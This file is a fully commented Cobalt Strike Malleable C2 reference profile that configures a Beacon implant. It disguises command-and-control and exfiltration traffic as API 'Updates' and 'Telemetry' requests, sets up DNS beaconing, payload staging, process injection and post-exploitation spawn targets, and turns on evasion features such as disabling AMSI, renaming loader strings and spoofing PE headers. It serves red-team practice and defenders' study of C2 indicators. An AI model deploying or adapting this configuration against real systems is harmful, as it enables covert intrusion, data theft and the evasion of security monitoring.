# This profile is meant to show all of the options available in Malleable C2
# Based on official Cobalt Strike 4.6 user guide and reference.profile
# For updates, see https://github.com/Pernat1y/cobaltstrike-malleable-c2-reference


# Append random-length string (up to data_jitter value) to http-get and http-post server output.
set data_jitter "0";

# Comma-separated list of HTTP client headers to remove from Beacon C2
set headers_remove "0";

# Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set host_stage "true";

# Default jitter factor (0-99%)
set jitter "0";

# Default name of pipe to use for SMB Beacon's peer-to- peer communication. Each # is replaced with a random hex value.
set pipename "msagent_###";

# Name of pipe to use for SMB Beacon's named pipe stager. Each # is replaced with a random hex value.
set pipename_stager "status_##";

# The name of this profile (used in the Indicators of Compromise report)
set sample_name "My Profile";

# Default sleep time (in milliseconds)
set sleeptime "60000";

# Prepend header to SMB Beacon messages
set smb_frame_header "";

# SSH client banner
set ssh_banner "Cobalt Strike 4.2";

# Name of pipe for SSH sessions. Each # is replaced with a random hex value.
set ssh_pipename "postex_ssh_####";

# The maximum size (in bytes) of task(s) and proxy data that can be transferred through a communication channel at a check in
# Cobalt Strike 4.6+
set tasks_max_size "1048576";

# The maximum size (in bytes) of proxy data to transfer via the communication channel at a check in.
# Cobalt Strike 4.6+
tasks_proxy_max_size "921600";

# The maximum size (in bytes) of proxy data to transfer via the DNS communication channel at a check in.
# Cobalt Strike 4.6+
tasks_dns_proxy_max_size "71680";

# Prepend header to TCP Beacon messages
set tcp_frame_header "";

# Default TCP Beacon listen port
set tcp_port "4444";

# Default User-Agent for HTTP comms.
set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";



# HTTP Server Configuration
http-config {
    # This option specifies the order these HTTP headers are delivered in an HTTP response.
    # Any headers not in this list are added to the end.
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";

    # This keyword adds a header value to each of Cobalt Strike's HTTP responses.
    # If the header value is already defined in a response, this value is ignored.
    header "Server" "Apache";
    header "Keep-Alive" "timeout=5, max=100";
    header "Connection" "Keep-Alive";

    # This option decides if Cobalt Strike uses the X-Forwarded-For HTTP
    # header to determine the remote address of a request. Use this option if your Cobalt Strike
    # server is behind an HTTP redirector.
    set trust_x_forwarded_for "true";

    # These options configure a list of user agents that are
    # blocked or allowed with a 404 response. By default, requests from user agents that start
    # with curl, lynx, or wget are all blocked. If both are specified, block_useragents will take
    # precedence over allow_useragents. The option value supports a string of comma
    # separated values.
    set block_useragents "curl*,lynx*,wget*";
    #set allow_useragents "";
}



# Self-signed SSL Certificates with SSL Beacon
https-certificate {
    # Country
    set C "US";

    # Common Name; Your callback domain
    set CN "beacon.cobaltstrike.com";

    # Locality
    set L "Washington";

    # Organization Name
    set O "Help/Systems LLC";

    # Organizational Unit Name
    set OU "Certificate Department";

    # State or Province
    set ST "DC";

    # Number of days certificate is valid for
    set validity "365";
}



# Valid SSL Certificates with SSL Beacon
https-certificate {
    # Java Keystore file with certificate information
    set keystore "domain.store";

    # The password to your Java Keystore
    set password "mypassword";
}



# Code Signing Certificate
code-signer {
    # The keystore's alias for this certificate
    set alias "server";

    # The digest algorithm
    set digest_algorithm "SHA256";

    # Java Keystore file with certificate information
    set keystore "keystore.jks";

    # The password to your Java Keystore
    set password "mypassword";

    # Timestamp the file using a third-party service
    set timestamp "false";

    # URL of the timestamp service
    set timestamp_url "http://timestamp.digicert.com";
}



# Stager is only supported as a GET request and it will use AFAICT the IE on Windows.
http-stager {
    # x86 payload stage URI
    set uri_x86 "/api/v1/GetLicence";

    # x64 payload stage URI    
    set uri_x64 "/api/v2/GetLicence";

    # 
    client {
        parameter "uuid" "96c5f1e1-067b-492e-a38b-4f6290369121";
        #header "headername" "headervalue";
    }

    # 
    server {
        header "Content-Type" "application/octet-stream";    
        header "Content-Encoding" "gzip";    
        output {        
            #GZIP headers and footers
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
            # AFAICT print is the only supported terminator
            print;
        }
    }
}



# Define indicators for an set GET
http-get {
	# Transaction URI
	set uri "/api/v1/Updates";

	client {
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";

		# mask our metadata, base64 encode it, store it in the URI
		metadata {
            # XOR encode the value
			mask;
            
            # URL-safe Base64 Encode
			#base64url;

            # URL-safe Base64 Encode
			base64;

            # NetBIOS Encode 'a' ?
            #netbios;

            #NetBIOS Encode 'A'
            #netbiosu;

            # You probably want these to be last two, else you will encode these values

            # Append a string to metadata
            append ";" ;

            # Prepend a string
            prepend "SESSION=";
            # Terminator statements - these say where the metadata goes
            # Pick one

            # Append to URI
			#uri-append;
            
            #Set in a header
            header "Cookie";

            #Send data as transaction body
            #print

            #Store data in a URI parameter
            #parameter "someparam"
		}
	}

	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";

		# Prepend some text in case the GET is empty.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}



# Define indicators for an set POST
http-post {
	set uri "/api/v1/Telemetry/Id/";
	set verb "POST";

	client {
		# make it look like we're posting something cool.
		header "Content-Type" "application/json";
        header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";

		# ugh, our data has to go somewhere!
		output {
			mask;
			base64url;
			uri-append;
		}

		# randomize and post our session ID
		id {
			mask;
			base64url;
			prepend "{version: 1, d=\x22";            
			append "\x22}\n";
			print;
		}
	}

	# The server's response to our set POST
	server {
		header "Content-Type" "application/octet-stream";
        header "Content-Encoding" "gzip";

		# Post usually sends nothing, so let's prepend a string, mask it, and
		# base64 encode it. We'll get something different back each time.
		output {
			mask;
			base64;
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";			
			print;
		}
	}
}



# DNS Beacons
dns-beacon "optional-variant-name" {
    # IP address used to indicate no tasks are available to DNS Beacon; Mask for other DNS C2 values
    set dns_idle "0.0.0.0";

    # Maximum length of DNS TXT responses for tasks
    set dns_max_txt "252";

    # Force a sleep prior to each individual DNS request. (in milliseconds)
    set dns_sleep "0";

    # Prepend text to payload stage delivered to DNS TXT record stager
    set dns_stager_prepend "";

    # Subdomain used by DNS TXT record stager.
    set dns_stager_subhost ".stage.123456.";

    # TTL for DNS replies
    set dns_ttl "1";

    # Maximum length of hostname when uploading data over DNS (0-255)
    set maxdns "255";

    # DNS subhost prefix used for beaconing requests. (lowercase text)
    set beacon "";

    # DNS subhost prefix used for A record requests (lowercase text)
    set get_A "cdn.";

    # DNS subhost prefix used for AAAA record requests (lowercase text)
    set get_AAAA "www6.";

    # DNS subhost prefix used for TXT record requests (lowercase text)
    set get_TXT "api.";

    # DNS subhost prefix used for metadata requests (lowercase text)
    set put_metadata "www.";

    # DNS subhost prefix used for output requests (lowercase text)
    set put_output "post.";

    # How to process NS Record requests.
    # "drop" does not respond to the request (default),
    # "idle" responds with A record for IP address from "dns_idle",
    # "zero" responds with A record for 0.0.0.0
    set ns_response "drop";
}



# PE and Memory Indicators
stage {
    # Set how Beacon's Reflective Loader allocates memory for the agent.
    # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc.
    set allocator "HeapAlloc";

    # Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
    set cleanup "false";

    # Override the first bytes (MZ header included) of Beacon's Reflective DLL. Valid x86 instructions are required.
    # Follow instructions that change CPU state with instructions that undo the change.
    set magic_mz_x86 "MZRE";

    # Same as magic_mz_x86; affects x64 DLL
    set magic_mz_x64 "MZAR";

    # Override the PE character marker used by Beacon's Reflective Loader with another value.
    set magic_pe "PE";

    # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
    set module_x86 "xpsservices.dll";

    # Same as module_x86; affects x64 loader
    set module_x64 "xpsservices.dll";

    # Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
    set obfuscate "false";

    # Obfuscate Beacon and it's heap, in-memory, prior to sleeping.
    set sleep_mask "false";

    # Use embedded function pointer hints to bootstrap Beacon agent without walking kernel32 EAT
    set smartinject "false";

    # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
    set stomppe "false";

    # Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
    set userwx "false";

    # The CheckSum value in Beacon's PE header
    set checksum "0";

    # The build time in Beacon's PE header
    set compile_time "14 Jul 2009 8:14:00";
    
    # The EntryPoint value in Beacon's PE header
    set entry_point "92145";

    # SizeOfImage value in x64 Beacon's PE header
    set image_size_x64 "512000";

    # SizeOfImage value in x86 Beacon's PE header
    set image_size_x86 "512000";
    
    # The Exported name of the Beacon DLL
    set name "beacon.x64.dll";
    
    # Meta-information inserted by the compiler
    set rich_header "";

    #
    transform-x86 {
        prepend "\x90\x90";
        strrep "ReflectiveLoader" "DoLegitStuff";
    }
    transform-x64 {
        # transform the x64 rDLL stage
    }
    stringw "I am not Beacon";
}



# Process Injection
process-inject {
    # The preferred method to allocate memory in the remote process. Specify VirtualAllocEx or NtMapViewOfSection.
    # The NtMapViewOfSection option is for same-architecture injection only.
    # VirtualAllocEx is always used for cross-arch memory allocations.
    set allocator "VirtualAllocEx";

    # Minimum amount of memory to request for injected content
    set min_alloc "4096";

    # Use RWX as initial permissions for injected content. Alternative is RW.
    set startrwx "false";

    # Use RWX as final permissions for injected content. Alternative is RX.
    set userwx "false";

    # 
    transform-x86 {
        prepend "\x90\x90";
    }
    transform-x64 {
        # transform x64 injected content
    }

    # determine how to execute the injected code
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        RtlCreateUserThread;
    }
}



# Controlling Post Exploitation
post-ex {
    # Control the temporary process we spawn to
    set spawnto_x86 "%windir%\\syswow64\\rundll32.exe";
    set spawnto_x64 "%windir%\\sysnative\\rundll32.exe";

    # Change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # Change our post-ex output named pipe names...
    set pipename "evil_####, stuff\\not_##_ev#l";

    # Pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # Disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
}


